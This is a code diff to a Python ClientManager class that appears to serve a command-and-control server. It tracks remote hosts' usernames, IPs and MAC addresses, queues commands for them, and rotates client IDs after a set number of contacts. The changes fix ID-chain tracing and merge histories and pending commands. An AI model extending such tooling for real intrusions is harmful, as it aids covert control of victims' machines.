@@ -109,7 +109,44 @@ class ClientManager:
             # Store the current ID in the client info
             self.clients[original_id]['current_client_id'] = current_id
             # Also store the original ID to make it easier to track
-            self.clients[original_id]['original_client_id'] = original_id
+            if 'original_client_id' not in self.clients[original_id]:
+                self.clients[original_id]['original_client_id'] = original_id
+            
+            # If this is not the first rotation, ensure the new ID also points back to original
+            if current_id != original_id:
+                # Create an entry for the new ID if it doesn't exist yet
+                if current_id not in self.clients:
+                    # Copy minimal information to the new ID entry
+                    self.clients[current_id] = {
+                        "last_seen": self.clients[original_id]["last_seen"],
+                        "ip": self.clients[original_id]["ip"],
+                        "hostname": self.clients[original_id].get("hostname", "Unknown"),
+                        "pending_commands": [],  # Start with no pending commands
+                        "history": [],           # Start with no history
+                        "original_client_id": original_id,  # Point back to true original
+                        "communication_counter": 0,  # Reset counter for the new ID
+                        "rotation_commands_sent": 0   # Reset rotation tracking
+                    }
+                    
+                    # Copy verification status if available
+                    if "verification_status" in self.clients[original_id]:
+                        self.clients[current_id]["verification_status"] = self.clients[original_id]["verification_status"].copy()
+                    
+                    # Copy system info if available, but only essential fields
+                    if "system_info" in self.clients[original_id]:
+                        self.clients[current_id]["system_info"] = {}
+                        for key, value in self.clients[original_id]["system_info"].items():
+                            if key in ["Hostname", "IP", "Username", "OsVersion", "MacAddress"]:
+                                self.clients[current_id]["system_info"][key] = value
+                else:
+                    # Update existing entry to point to original
+                    # Make sure we're pointing to the true original, not an intermediate ID
+                    true_original = self.get_true_original_id(original_id)
+                    if true_original and true_original in self.clients:
+                        self.clients[current_id]["original_client_id"] = true_original
+                    else:
+                        # Fall back to the provided original ID
+                        self.clients[current_id]["original_client_id"] = original_id
             
             self.log_event(original_id, "Security", f"Client ID rotated to {current_id}")
             
@@ -124,6 +161,43 @@ class ClientManager:
             return True
         return False
 
+    def get_true_original_id(self, client_id):
+        """
+        Recursively trace back through the client ID chain to find the first original ID
+        
+        Args:
+            client_id: The client ID to start the search from
+            
+        Returns:
+            The true original client ID or the input client_id if the chain can't be traced
+        """
+        if not client_id or client_id not in self.clients:
+            return client_id
+            
+        visited_ids = set()  # To detect cycles
+        current_id = client_id
+        
+        while current_id and current_id in self.clients:
+            # Check for cycles
+            if current_id in visited_ids:
+                # We found a cycle, break and use the last valid ID
+                break
+                
+            visited_ids.add(current_id)
+            
+            # Get the recorded original ID for this client
+            original_id = self.clients[current_id].get("original_client_id")
+            
+            # If it's the same as current or not set, we've reached the start of the chain
+            if not original_id or original_id == current_id:
+                return current_id
+                
+            # Continue tracing back
+            current_id = original_id
+        
+        # If we couldn't find the true original, return the input ID
+        return client_id
+
     def get_client_by_current_id(self, current_id):
         """Find the original client ID by the current rotated ID"""
         for client_id, client_info in self.clients.items():
@@ -135,13 +209,12 @@ class ClientManager:
         """Find the original client ID regardless of whether client_id is original or current"""
         # First check if this is already an original ID
         if client_id in self.clients:
-            if self.clients[client_id].get('original_client_id') == client_id:
-                return client_id
-            
-        # If not, check if it's a current ID and find the corresponding original
-        for orig_id, client_info in self.clients.items():
-            if client_info.get('current_client_id') == client_id:
-                return orig_id
+            # If it has an original_client_id field that's different from itself,
+            # it's a rotated ID, so get the original
+            if "original_client_id" in self.clients[client_id] and self.clients[client_id]["original_client_id"] != client_id:
+                return self.clients[client_id]["original_client_id"]
+            # Otherwise it might be an original ID itself
+            return client_id
         
         # If not found, just return the input ID
         return client_id
@@ -266,15 +339,50 @@ class ClientManager:
 
     def get_client_history(self, client_id):
         """Get command history for a specific client"""
-        # Find the original client ID if we're given a rotated ID
+        # Find the original client ID
         original_id = self.get_original_client_id(client_id)
-        return self.clients.get(original_id, {}).get("history", [])
+        
+        # Get the history from the original ID
+        history = self.clients.get(original_id, {}).get("history", [])
+        
+        # Also check if this client has a current ID and get history from there too
+        current_id = self.get_current_client_id(original_id)
+        if current_id and current_id != original_id and current_id in self.clients:
+            # Add history from current ID if it exists and has any
+            current_history = self.clients.get(current_id, {}).get("history", [])
+            if current_history:
+                # Combine histories, but avoid duplicates based on timestamp
+                existing_timestamps = {cmd.get("timestamp") for cmd in history}
+                for cmd in current_history:
+                    if cmd.get("timestamp") not in existing_timestamps:
+                        history.append(cmd)
+                
+                # Sort combined history by timestamp
+                history.sort(key=lambda cmd: cmd.get("timestamp", ""))
+        
+        return history
 
     def get_pending_commands(self, client_id):
         """Get pending commands for a specific client"""
-        # Find the original client ID if we're given a rotated ID
+        # Find the original client ID
         original_id = self.get_original_client_id(client_id)
-        return self.clients.get(original_id, {}).get("pending_commands", [])
+        
+        # Get pending commands from original ID
+        commands = self.clients.get(original_id, {}).get("pending_commands", [])
+        
+        # Also check the current ID if different
+        current_id = self.get_current_client_id(original_id)
+        if current_id and current_id != original_id and current_id in self.clients:
+            # Add pending commands from current ID
+            current_commands = self.clients.get(current_id, {}).get("pending_commands", [])
+            if current_commands:
+                # Check for duplicates based on timestamp
+                existing_timestamps = {cmd.get("timestamp") for cmd in commands}
+                for cmd in current_commands:
+                    if cmd.get("timestamp") not in existing_timestamps:
+                        commands.append(cmd)
+        
+        return commands
 
     def clear_pending_commands(self, client_id):
         """Clear all pending commands for a client"""
@@ -491,7 +599,7 @@ class ClientManager:
 
     def increment_communication_counter(self, client_id):
         """Increment the communication counter for a client and check if rotation is needed"""
-        # Find the original client ID if we're given a rotated ID
+        # Find the original client ID
         original_id = self.get_original_client_id(client_id)
         
         if original_id in self.clients:
@@ -502,6 +610,9 @@ class ClientManager:
             # Increment counter
             self.clients[original_id]["communication_counter"] += 1
             counter = self.clients[original_id]["communication_counter"]
+            
+            # Log the counter (helpful for debugging)
+            self.log_event(original_id, "Communication", f"Communication counter: {counter}/{self.rotation_frequency}")
             
             # Check if we need to auto-rotate based on counter and configuration
             if self.auto_rotation_enabled and counter >= self.rotation_frequency:
